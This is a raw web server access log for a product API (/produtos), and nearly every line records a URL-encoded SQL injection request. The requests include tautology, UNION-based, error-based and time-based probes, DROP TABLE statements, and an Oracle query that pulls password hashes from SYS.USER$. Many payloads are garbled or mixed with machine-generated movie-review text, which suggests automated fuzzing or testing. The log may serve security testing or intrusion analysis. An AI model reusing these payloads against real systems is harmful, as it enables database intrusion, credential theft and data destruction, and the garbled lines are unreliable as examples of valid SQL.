Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - DELETE /produtos/test1'%20)%20)%20)%20and%206055%20=%20ctxsys.drithsx.sn%20(%206055,%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%206055%20=%206055%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20(%20122%20)%20%7C HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%25%22%20)%20)%20or%205356%20=%20(%20select%20count%20(%20*%20)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/testseLECT%20*%20FrOm%20USerS%20wHerE%20ID%20like%200x1%20oR%20%22%20(%20;%22%20Or%200x1%20=%20(seLEct%20(sElECT%20(SELECT%204)))%20--%206'5LU HTTP/1.1
172.18.0.1 - DELETE /produtos/testThe%20movie%20was%20a%20show%20and%20the%20start%20underrated%20and%20let%20me%20well%20acted%20for%20a%20comedy.%20This%20is%20the%20third%20popular%20TV%20was%20one%20of%20the%20worst%20movies%20I%20have%20ever%20seen.%20The%20video%20version%20of%20this%20film%20will%20start%20disappointed%20at%20a%20permany%20where%20and%20the%20complex%20feat%20stu HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20)%20)%20or%20extractvalue%20(%201297,concat%20(%200x5c,0x7171706a71,%20(%20select%20(%20elt%20(%201297%20=%201297,1%20)%20)%20)%20,0x717a767a71%20)%20)%20and%20(%20(%20(%20'dqjq'%20=%20'dqjq HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20)%20)%20or%202367%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20)%20or%205286%20=%20(%20select%20count%20(%20*%20)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5%20) HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+OR+%271%27%3D%271+--&categoria=%27+OR+%271%27%3D%271+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+OR+%271%27%3D%271%2F%2A%2A%2F&categoria=%27+OR+%271%27%3D%271%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+OR+%271%27%3D%271%23&categoria=%27+OR+%271%27%3D%271%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+OR+%271%27%3D%271&categoria=%27+OR+%271%27%3D%271 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+OR+%271%27%3D%271%23+--&categoria=%27+OR+%271%27%3D%271%23+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%40verscolame+%29+FroM+%28+SELECT+%40%40version+%29+%2C+%28+SELECT+0o0O0o2X2%29%2CVerSIon+%28+%29+--+1%279c&categoria=%27+UNION+SELECT+%40%40verscolame+%29+FroM+%28+SELECT+%40%40version+%29+%2C+%28+SELECT+0o0O0o2X2%29%2CVerSIon+%28+%29+--+1%279c HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%28+--&categoria=%27+UNION+SELECT+%40%28+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+--&categoria=%27+UNION+SELECT+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+conversetanees+trie+%2C+%29+%29+%2C+1%2Cversion+%28+%29+and+%22ilbc%22+like+%22libc&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+conversetanees+trie+%2C+%29+%29+%2C+1%2Cversion+%28+%29+and+%22ilbc%22+like+%22libc HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+--&categoria=%27+UNION+SELECT+%40+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+benchmart+%29+%2C1000%2C1001+%29+and+%28+1021+%3D+9012&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+benchmart+%29+%2C1000%2C1001+%29+and+%28+1021+%3D+9012 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+-+Table_name+%28+DVM%2F%2AInc%2A%2F+%29+%27sinc%27%2C+SIseNtions+SEeC+%29+%2C0X0o0o0x0o0o0B100%2CS&categoria=%27+UNION+SELECT+-+Table_name+%28+DVM%2F%2AInc%2A%2F+%29+%27sinc%27%2C+SIseNtions+SEeC+%29+%2C0X0o0o0x0o0o0B100%2CS HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+benchmart+%29+%2C1000%2C110+%29+%29+AND+%27ils%27+%3D+%27&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+benchmart+%29+%2C1000%2C110+%29+%29+AND+%27ils%27+%3D+%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+libe%3A2b111111%2C1%2C1O19+%29+%26%26+1+%29+OR+%28SELECT+0%29+OR+False%23C&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+libe%3A2b111111%2C1%2C1O19+%29+%26%26+1+%29+OR+%28SELECT+0%29+OR+False%23C HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cname_NbMes%2C+NALL_%24+%28+1%2C1%2C1%2C141%2C1%2C141&categoria=%27+UNION+SELECT+%28+table_samerial%2Cname_NbMes%2C+NALL_%24+%28+1%2C1%2C1%2C141%2C1%2C141 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentybel+live+%27ibatevin%27+%29+%3Bwaitfor+%27exat%27+%29&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentybel+live+%27ibatevin%27+%29+%3Bwaitfor+%27exat%27+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+converseantelet%27+%29+vertion_tabe_all&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+converseantelet%27+%29+vertion_tabe_all HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%273%27+--&categoria=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%273%27+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28callent+%29+version+%29+%2B%27&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28callent+%29+version+%29+%2B%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+%27ynom%27%2C+%29+%2C1%2C1+%29+%29+%3D+1+--&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+%27ynom%27%2C+%29+%2C1%2C1+%29+%29+%3D+1+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28char%3Bly%24typeabale+%29+%3B%3B%27&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28char%3Bly%24typeabale+%29+%3B%3B%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28char%3Bly%24typeabale+%29+%3B+and+1+%3D+%22&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28char%3Bly%24typeabale+%29+%3B+and+1+%3D+%22 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verseoncmane+%28+%27DboC%27+%29+%2C%2C%28SELect+%28SeLEct+%28SELecT+1%29%29%29+%29+aNd+%22w%22+LIkE+%22w%22%22+AND+0&categoria=%27+UNION+SELECT+%40+verseoncmane+%28+%27DboC%27+%29+%2C%2C%28SELect+%28SeLEct+%28SELecT+1%29%29%29+%29+aNd+%22w%22+LIkE+%22w%22%22+AND+0 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28+%29%2C%2C%400x0%2C0X0o3%29+aND+0X1+aNd+%22w%22+noT+lIKE+%22WN%22+oR+fALSE+aNd+TRUe+oR+faLSE&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28+%29%2C%2C%400x0%2C0X0o3%29+aND+0X1+aNd+%22w%22+noT+lIKE+%22WN%22+oR+fALSE+aNd+TRUe+oR+faLSE HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+ullepall+cavere+tamled+varielint+%27vasiate+version+that+that+may+have+a+band+in+the+Us+and+Arahi+and+how+their+two+little+perfor+cancled+a+fresh+thing+appreciation.+The+story+is+responsible+for+the+nationity+trying+to+compare+the&categoria=%27+UNION+SELECT+%40+%2C+ullepall+cavere+tamled+varielint+%27vasiate+version+that+that+may+have+a+band+in+the+Us+and+Arahi+and+how+their+two+little+perfor+cancled+a+fresh+thing+appreciation.+The+story+is+responsible+for+the+nationity+trying+to+compare+the HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verale_tembent+Tems%27+AND+1+%3D+utl_inaddr.get_host_address+%28+%28+SELECT+DISTINCT+%28+PASSWORD+%29+FROM+%28+SELECT+DISTINCT+%28+PASSWORD+%29+%2C+ROWNUM+AS+LIMIT+FROM+SYS.USER%24+%29+WHERE+LIMIT+%3D+1+%29+%29+AND+%27i%27+%3D+%27i&categoria=%27+UNION+SELECT+%40+verale_tembent+Tems%27+AND+1+%3D+utl_inaddr.get_host_address+%28+%28+SELECT+DISTINCT+%28+PASSWORD+%29+FROM+%28+SELECT+DISTINCT+%28+PASSWORD+%29+%2C+ROWNUM+AS+LIMIT+FROM+SYS.USER%24+%29+WHERE+LIMIT+%3D+1+%29+%29+AND+%27i%27+%3D+%27i HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+full+charstander%2C1%29+and+%271%27+%3D+%271&categoria=%27+UNION+SELECT+%40+full+charstander%2C1%29+and+%271%27+%3D+%271 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%40verscomance%28%29%3A+%402O0x1+~%29+AND+%22i%22+NIt+LIKE+%22iin%22+or+%22p%22+NOT+lIKE+%22p%22+oR+fALsE+--&categoria=%27+UNION+SELECT+%40%40verscomance%28%29%3A+%402O0x1+~%29+AND+%22i%22+NIt+LIKE+%22iin%22+or+%22p%22+NOT+lIKE+%22p%22+oR+fALsE+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Calecture%27+%29+and+%27ybl%27+%3D+%27yblb&categoria=%27+UNION+SELECT+%40+%2C+users%2Calecture%27+%29+and+%27ybl%27+%3D+%27yblb HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verseoncmane+%29+%28%25%2F%2A%2A%2F&categoria=%27+UNION+SELECT+%40+verseoncmane+%29+%28%25%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verseoncmant+iDe+FROM+tuba_nom_Gives+where+1+%3D+110+%29+or+1+group+by+concat+%28+0x7171706a71%2C+%28+select+%28+case+when+%28+4232+%3D+4232+%29+then+1+else+0+end+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+having+min+%28+0+%29+%23&categoria=%27+UNION+SELECT+%40+verseoncmant+iDe+FROM+tuba_nom_Gives+where+1+%3D+110+%29+or+1+group+by+concat+%28+0x7171706a71%2C+%28+select+%28+case+when+%28+4232+%3D+4232+%29+then+1+else+0+end+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+having+min+%28+0+%29+%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+-+Table_name+%28+cHr+%29+%3B%27&categoria=%27+UNION+SELECT+-+Table_name+%28+cHr+%29+%3B%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+S%27+ulem&categoria=%27+UNION+SELECT+S%27+ulem HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verseoncmane+%28+%27Dbo%27+%29+%2CvErsIOn+%28+%29+--+1&categoria=%27+UNION+SELECT+%40+verseoncmane+%28+%27Dbo%27+%29+%2CvErsIOn+%28+%29+--+1 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+-+Table_name%27%3B+TROM_ibMiMH%27s+LIcE+%28+%27hACT%27+%29+%27I&categoria=%27+UNION+SELECT+-+Table_name%27%3B+TROM_ibMiMH%27s+LIcE+%28+%27hACT%27+%29+%27I HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verseoncmant+ide+%3D+%27~%27+or+%270%27+LIKE+%270o0B0%27+--&categoria=%27+UNION+SELECT+%40+verseoncmant+ide+%3D+%27~%27+or+%270%27+LIKE+%270o0B0%27+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+S&categoria=%27%3B+DROP+TABLE+S HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+%28+--&categoria=%27%3B+DROP+TABLE+%28+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+--&categoria=%27%3B+DROP+TABLE+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+SEM+UNOM%3BALL+1+1+--&categoria=%27%3B+DROP+TABLE+SEM+UNOM%3BALL+1+1+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+SEM&categoria=%27%3B+DROP+TABLE+SEM HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+SE&categoria=%27%3B+DROP+TABLE+SE HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+SEM+UNOT+ALL+TADE+1%27+%29+%2B+%28+SELECT+%27PYjZ%27+FRoM+DuaL+wHerE+0X13ad+%3D+0x0X0X15b1+aNd+%28+selEcT&categoria=%27%3B+DROP+TABLE+SEM+UNOT+ALL+TADE+1%27+%29+%2B+%28+SELECT+%27PYjZ%27+FRoM+DuaL+wHerE+0X13ad+%3D+0x0X0X15b1+aNd+%28+selEcT HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+SEm&categoria=%27%3B+DROP+TABLE+SEm HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%22+OR+%221%22%3D%221%22+--&categoria=%22+OR+%221%22%3D%221%22+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%2B+%28+select+mfcd+where+6757+%3D+6757+and+4386+%3D+utl_inaddr.get_host_address+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%7C%7C+%28+select+%28+case+when+%28+4386+%3D+4386+%29+then+1+else+0+end+%29+from+dual+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+122+%29+%7C%7Cchr&categoria=1%27%2B+%28+select+mfcd+where+6757+%3D+6757+and+4386+%3D+utl_inaddr.get_host_address+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%7C%7C+%28+select+%28+case+when+%28+4386+%3D+4386+%29+then+1+else+0+end+%29+from+dual+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+122+%29+%7C%7Cchr HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22%29%29+as+wuwz+where+5339%3D5339+and+2716%3D%28select+count%28%2A%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7%29+--&categoria=1%22%29%29+as+wuwz+where+5339%3D5339+and+2716%3D%28select+count%28%2A%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=select+%2A+from+users+where+id+%3D+%271%27+or+%21%3C%40+or+1+%3D+1+--+1%27&categoria=select+%2A+from+users+where+id+%3D+%271%27+or+%21%3C%40+or+1+%3D+1+--+1%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+and+extractvalue+%28+7982%2Cconcat+%28+0x5c%2C0x7171706a71%2C+%28+select+%28+elt+%28+7982+%3D+7982%2C1+%29+%29+%29+%2C0x717a767a71+%29+%29+and+%27pphf%27+%3D+%27pphf&categoria=1%27+and+extractvalue+%28+7982%2Cconcat+%28+0x5c%2C0x7171706a71%2C+%28+select+%28+elt+%28+7982+%3D+7982%2C1+%29+%29+%29+%2C0x717a767a71+%29+%29+and+%27pphf%27+%3D+%27pphf HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-8790%27+%29+or+1570+%3D+convert+%28+int%2C+%28+select+char+%28+113+%29+%2Bchar+%28+113+%29+%2Bchar+%28+112+%29+%2Bchar+%28+106+%29+%2Bchar+%28+113+%29+%2B+%28+select+%28+case+when+%28+1570+%3D+1570+%29+then+char+%28+49+%29+else+char+%28+48+%29+end+%29+%29+%2Bc&categoria=-8790%27+%29+or+1570+%3D+convert+%28+int%2C+%28+select+char+%28+113+%29+%2Bchar+%28+113+%29+%2Bchar+%28+112+%29+%2Bchar+%28+106+%29+%2Bchar+%28+113+%29+%2B+%28+select+%28+case+when+%28+1570+%3D+1570+%29+then+char+%28+49+%29+else+char+%28+48+%29+end+%29+%29+%2Bc HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=0%27+%29+%29+as+yYyk+wHEre+%28sELEcT+%28SELEct+%28sEleCt+%28sElecT+0x2156%29%29%29%29+lIkE+%28SeLeCt+%28sELEcT+%28sElEct+5x215b%29%29%29+OR+%28SelEcT+0o0o17302%29+liKe+%28+sELecT+COuNt+%28+%2A+%29+FRom%3FDOmaiN.DoMaINs+aS+T1%2CdOmain.columnS+aS+T2%2CDoMAiN.TablEs+AS+T3+~%29+aNd+TRuE+AN&categoria=0%27+%29+%29+as+yYyk+wHEre+%28sELEcT+%28SELEct+%28sEleCt+%28sElecT+0x2156%29%29%29%29+lIkE+%28SeLeCt+%28sELEcT+%28sElEct+5x215b%29%29%29+OR+%28SelEcT+0o0o17302%29+liKe+%28+sELecT+COuNt+%28+%2A+%29+FRom%3FDOmaiN.DoMaINs+aS+T1%2CdOmain.columnS+aS+T2%2CDoMAiN.TablEs+AS+T3+~%29+aNd+TRuE+AN HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=This+film+is+a+very+very+good+movie.+I+had+no+idea+what+would+say+that+it+was+a+high-stopy+%28B+--&categoria=This+film+is+a+very+very+good+movie.+I+had+no+idea+what+would+say+that+it+was+a+high-stopy+%28B+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+as+fhvb+where+4008+%3D+4008&categoria=1+%29+as+fhvb+where+4008+%3D+4008 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-2787%27+union+all+select+3622%2C3622%2C3622%2C3622%2C3622%2C3622%2C3622%2C3622%2C3622%2C3622%23&categoria=-2787%27+union+all+select+3622%2C3622%2C3622%2C3622%2C3622%2C3622%2C3622%2C3622%2C3622%2C3622%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+%29+as+beld+where+1679+%3D+1679+or+sleep+%28+5+%29+%23&categoria=1+%29+%29+as+beld+where+1679+%3D+1679+or+sleep+%28+5+%29+%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22%29+where+8702%3D8702+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull+--&categoria=1%22%29+where+8702%3D8702+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+or+2633+%3D+dbms_pipe.receive_message+%28+chr+%28+112+%29+%7C%7Cchr+%28+65+%29+%7C%7Cchr+%28+65+%29+%7C%7Cchr+%28+103+%29+%2C5+%29+and+%28+%28+%27stqq%27+%3D+%27stqq&categoria=1%27+%29+%29+or+2633+%3D+dbms_pipe.receive_message+%28+chr+%28+112+%29+%7C%7Cchr+%28+65+%29+%7C%7Cchr+%28+65+%29+%7C%7Cchr+%28+103+%29+%2C5+%29+and+%28+%28+%27stqq%27+%3D+%27stqq HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-5830+%29+or+1570+%3D+convert+%28+int%2C+%28+select+char+%28+113+%29+%2Bchar+%28+113+%29+%2Bchar+%28+112+%29+%2Bchar+%28+106+%29+%2Bchar+%28+113+%29+%2B+%28+select+%28+case+when+%28+1570+%3D+1570+%29+then+char+%28+49+%29+else+char+%28+48+%29+end+%29+%29+%2Bch&categoria=-5830+%29+or+1570+%3D+convert+%28+int%2C+%28+select+char+%28+113+%29+%2Bchar+%28+113+%29+%2Bchar+%28+112+%29+%2Bchar+%28+106+%29+%2Bchar+%28+113+%29+%2B+%28+select+%28+case+when+%28+1570+%3D+1570+%29+then+char+%28+49+%29+else+char+%28+48+%29+end+%29+%29+%2Bch HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-9922%27+%29+%29+union+all+select+2193%2C2193%2C2193+--&categoria=-9922%27+%29+%29+union+all+select+2193%2C2193%2C2193+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+where+2763+%3D+2763&categoria=1%22+%29+where+2763+%3D+2763 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%7C%7C+%28+select+%27vbao%27+where+5097+%3D+5097+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+--&categoria=1%27%7C%7C+%28+select+%27vbao%27+where+5097+%3D+5097+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+srmq+%29+and+%28+%28+%28+%22pxle%22+%3D+%22pxle&categoria=%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+srmq+%29+and+%28+%28+%28+%22pxle%22+%3D+%22pxle HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=union+%28+select+NULL%2C+NULL%2C+NULL%2C+NULL%2C+NULL%2C+%28+select+%40%40version+%29+%29+--&categoria=union+%28+select+NULL%2C+NULL%2C+NULL%2C+NULL%2C+NULL%2C+%28+select+%40%40version+%29+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+%29+%29+or+%28+select+2%2A+%28+if+%28+%28+select+%2A+from+%28+select+concat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+8113+%3D+8113%2C1+%29+%29+%29+%2C0x717a767a71%2C0x78+%29+%29+s+%29+%2C+8446744073709551610%2C+8446744073709551610+%29+%29&categoria=1%22+%29+%29+%29+or+%28+select+2%2A+%28+if+%28+%28+select+%2A+from+%28+select+concat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+8113+%3D+8113%2C1+%29+%29+%29+%2C0x717a767a71%2C0x78+%29+%29+s+%29+%2C+8446744073709551610%2C+8446744073709551610+%29+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+as+ezpq+where+2976+%3D+2976+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23&categoria=1%27+%29+%29+as+ezpq+where+2976+%3D+2976+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%29%29+as+popm+where+6594%3D6594+union+all+select+null%2Cnull%23&categoria=1%27%29%29+as+popm+where+6594%3D6594+union+all+select+null%2Cnull%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=0X0b0o0O0b1100111100101010000100001%5DuNion%21All+selEct%2F%2A%2A%2F%28select%2F%2Ah%3CG%7D%2A%2FNULL%2CnULL%2CnUlL%2CNULL%2CnULL%2CNuLl%2CnUlL%2CNuLL%2CNulL%2CnULL+--&categoria=0X0b0o0O0b1100111100101010000100001%5DuNion%21All+selEct%2F%2A%2A%2F%28select%2F%2Ah%3CG%7D%2A%2FNULL%2CnULL%2CnUlL%2CNULL%2CnULL%2CNuLl%2CnUlL%2CNuLL%2CNulL%2CnULL+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+and+6969+%3D+%28+select+6969+from+pg_sleep+%28+5+%29+%29+and+%28+%27nqol%27+%3D+%27nqol&categoria=1%27+%29+and+6969+%3D+%28+select+6969+from+pg_sleep+%28+5+%29+%29+and+%28+%27nqol%27+%3D+%27nqol HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+%29+as+vmwj+where+5597+%3D+5597&categoria=1+%29+%29+as+vmwj+where+5597+%3D+5597 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+as+estq+where+498%2F%2A%2A%2F&categoria=1%27+%29+%29+as+estq+where+498%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-5858+%29+as+irpx+where+1984+%3D+9184+union+all+select+1948%2C1948%2C1948%23&categoria=-5858+%29+as+irpx+where+1984+%3D+9184+union+all+select+1948%2C1948%2C1948%23 HTTP/1.1
